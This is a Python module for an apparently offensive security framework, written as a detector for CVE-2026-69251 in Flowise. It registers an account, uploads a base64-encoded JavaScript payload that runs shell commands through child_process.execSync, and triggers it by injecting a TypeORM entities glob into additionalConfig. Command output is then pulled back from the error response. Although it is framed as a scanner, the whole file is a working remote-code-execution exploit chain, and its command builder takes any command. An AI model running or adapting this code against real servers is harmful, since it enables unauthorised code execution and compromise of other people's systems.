#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Detect Flowise CVE-2026-69251 TypeORM DataSource options RCE."""

import base64
import json
import uuid

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.response_validation import parse_json_response


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Flowise CVE-2026-69251 TypeORM RCE Detect",
        "description": (
            "Detects CVE-2026-69251 in Flowise <= 3.1.2 (fixed 3.1.3): SQLiteRecordManager "
            "spreads user-supplied additionalConfig into TypeORM DataSource options; "
            "entities globs cause require() of attacker-uploaded .js during initialize(). "
            "Chains register, login, document store, File Loader upload, and vectorstore/insert."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-69251"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-69251",
            "https://www.cve.org/CVERecord?id=CVE-2026-69251",
        ],
        "modules": ["exploits/multi/http/flowise_cve_2026_69251_rce"],
        "tags": [
            "web",
            "scanner",
            "flowise",
            "nodejs",
            "typeorm",
            "code-injection",
            "rce",
            "cve-2026-69251",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 7,
            "reversible": False,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths", "rce"],
            "cost": 1.5,
            "noise": 0.5,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["flowise"],
                "endpoint_pattern_any": ["/api/v1/document-store/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "rce", "from_detail": "TypeORM entities glob require()"},
                ],
                "suggested_followups": [
                    "exploits/multi/http/flowise_cve_2026_69251_rce",
                ],
            },
        },
    }

    port = OptPort(3000, "Flowise HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    email = OptString(
        "opsec@alim.local",
        "Account email for register/login (first account is one-shot whitelisted)",
        False,
        advanced=True,
    )
    password = OptString(
        "Flowise@12345",
        "Account password",
        False,
        advanced=True,
    )
    vs_name = OptChoice(
        "postgres",
        "Vector store backend the target can reach",
        False,
        choices=["postgres", "chroma"],
        advanced=True,
    )
    vs_host = OptString(
        "pgvector",
        "Vector store host as seen from the target (or Chroma URL when vs_name=chroma)",
        False,
        advanced=True,
    )
    vs_port = OptInteger(5432, "Vector store port (postgres)", False, advanced=True)
    vs_db = OptString("flowise_vs", "Vector store database (postgres)", False, advanced=True)

    def _api(self, suffix: str) -> str:
        base = (self.path or "/").rstrip("/")
        if not suffix.startswith("/"):
            suffix = f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    def _headers(self) -> dict:
        return {"x-request-from": "internal"}

    def _build_js(self, command: str, marker: str) -> str:
        cmd_b64 = base64.b64encode(command.encode()).decode()
        return (
            "var cp = require('child_process');\n"
            f"var cmd = Buffer.from('{cmd_b64}', 'base64').toString();\n"
            "var out;\n"
            "try { out = cp.execSync(cmd + ' 2>&1').toString(); }\n"
            "catch (e) { out = (e.stdout ? e.stdout.toString() : '') + "
            "(e.stderr ? e.stderr.toString() : '') + String(e.message || e); }\n"
            f"throw new Error('{marker}:' + out + ':{marker}');\n"
        )

    def _extract_output(self, raw: str, marker: str):
        start = raw.find(marker + ":")
        if start == -1:
            return None
        start += len(marker) + 1
        end = raw.find(":" + marker, start)
        if end == -1:
            end = len(raw)
        out = raw[start:end]
        return out.replace("\\n", "\n").replace("\\t", "\t").replace('\\"', '"').strip()

    def _vs_config(self) -> dict:
        if str(self.vs_name or "postgres").lower() == "chroma":
            return {"chromaURL": str(self.vs_host or ""), "collectionName": "documents"}
        return {
            "host": str(self.vs_host or "pgvector"),
            "port": int(self.vs_port or 5432),
            "database": str(self.vs_db or "flowise_vs"),
            "tableName": "documents",
        }

    def run(self):
        headers = self._headers()
        email = str(self.email or "opsec@alim.local")
        password = str(self.password or "Flowise@12345")
        timeout = int(self.timeout or 15)
        upsert_timeout = max(timeout, 120)

        self.http_request(
            method="POST",
            path=self._api("/api/v1/account/register"),
            json={"user": {"name": "Admin", "email": email, "credential": password}},
            headers=headers,
            session=True,
            allow_redirects=False,
            timeout=timeout,
        )

        login = self.http_request(
            method="POST",
            path=self._api("/api/v1/auth/login"),
            json={"email": email, "password": password},
            headers=headers,
            session=True,
            allow_redirects=False,
            timeout=timeout,
        )
        if not login or int(login.status_code or 0) != 200:
            return False

        store_resp = self.http_request(
            method="POST",
            path=self._api("/api/v1/document-store/store"),
            json={"name": "s", "description": ""},
            headers=headers,
            session=True,
            allow_redirects=False,
            timeout=timeout,
        )
        body, err = parse_json_response(store_resp)
        store_id = (body or {}).get("id") if not err else None
        if not store_id:
            return False

        marker = "ALIM" + uuid.uuid4().hex[:16].upper()
        fname = "rce_" + uuid.uuid4().hex[:12] + ".js"
        js = self._build_js("id", marker)
        data_uri = (
            "data:text/javascript;base64,"
            + base64.b64encode(js.encode()).decode()
            + ",filename:"
            + fname
        )
        loader = {
            "storeId": store_id,
            "loaderId": "fileLoader",
            "loaderName": "File Loader",
            "loaderConfig": {"txtFile": data_uri, "splitterId": ""},
        }
        save = self.http_request(
            method="POST",
            path=self._api("/api/v1/document-store/loader/save"),
            json=loader,
            headers=headers,
            session=True,
            allow_redirects=False,
            timeout=timeout,
        )
        save_body, save_err = parse_json_response(save)
        loader_id = (save_body or {}).get("id") if not save_err else None
        if loader_id:
            self.http_request(
                method="POST",
                path=self._api(f"/api/v1/document-store/loader/process/{loader_id}"),
                json=loader,
                headers=headers,
                session=True,
                allow_redirects=False,
                timeout=timeout,
            )

        entities_glob = "/root/.flowise/storage/**/" + fname
        insert = {
            "storeId": store_id,
            "embeddingName": "openAIEmbeddings",
            "embeddingConfig": {
                "modelName": "text-embedding-ada-002",
                "openAIApiKey": "sk-dummy",
            },
            "vectorStoreName": str(self.vs_name or "postgres"),
            "vectorStoreConfig": self._vs_config(),
            "recordManagerName": "SQLiteRecordManager",
            "recordManagerConfig": {
                "tableName": "upsertion_records",
                "additionalConfig": json.dumps({"entities": [entities_glob]}),
            },
        }
        upsert = self.http_request(
            method="POST",
            path=self._api("/api/v1/document-store/vectorstore/insert"),
            json=insert,
            headers=headers,
            session=True,
            allow_redirects=False,
            timeout=upsert_timeout,
        )
        raw = (upsert.text or "") if upsert else ""
        if "Disallowed TypeORM DataSource option" in raw:
            print_status("CVE-2026-69251 patched (entities rejected)")
            return False

        out = self._extract_output(raw, marker)
        if out is None:
            low = raw.lower()
            if any(
                token in low
                for token in ("pgvector", "postgres", "econnrefused", "getaddrinfo", "connect")
            ):
                print_status("CVE-2026-69251 chain reached but vector store backend unreachable")
            return False

        first = out.splitlines()[0].strip() if out.splitlines() else out
        reason = f"CVE-2026-69251: RCE via TypeORM entities glob — id => {first}"
        print_status("CVE-2026-69251 vuln=True")
        self.set_info(
            severity="critical",
            reason=reason,
            vulnerable=True,
            cve="CVE-2026-69251",
            path=self._api("/api/v1/document-store/vectorstore/insert"),
        )
        return True
